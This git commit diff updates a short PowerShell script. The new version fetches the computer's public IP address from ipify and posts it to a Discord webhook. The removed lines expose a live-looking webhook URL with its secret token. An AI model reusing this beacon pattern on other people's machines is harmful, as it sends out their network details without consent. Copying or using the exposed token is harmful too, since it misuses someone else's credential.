ac23bd09adf25e397624f7f7539ef129e5c8e046
yehonatanm1 <yehonatanm09@gmail.com>
2025-09-16 12:01:16 +0300

    Update uno.sh

--- uno.sh
+++ uno.sh
@@ -1,3 +1,13 @@
-$webhook = "https://discord.com/api/webhooks/1380222529209241680/jOwJW5pI3_hLmcpsOVjSLsS3rZyYGiRDS49oKPa0myTKTAnRJ_vwqNhaFggDyJOfhji-"
-$body = @{ content = "הודעת מבחן מ-PowerShell" } | ConvertTo-Json
+# ה-WebHook של Discord
+$webhook = "https://discord.com/api/webhooks/XXXXXXXXX/XXXXXXXX"
+
+# מביא IP חיצונית מהשירות ipify
+$publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
+
+# הגוף לשליחה
+$body = @{
+    content = "ה-IP החיצונית של המחשב: $publicIP"
+} | ConvertTo-Json
+
+# שליחה ל-Discord
 Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
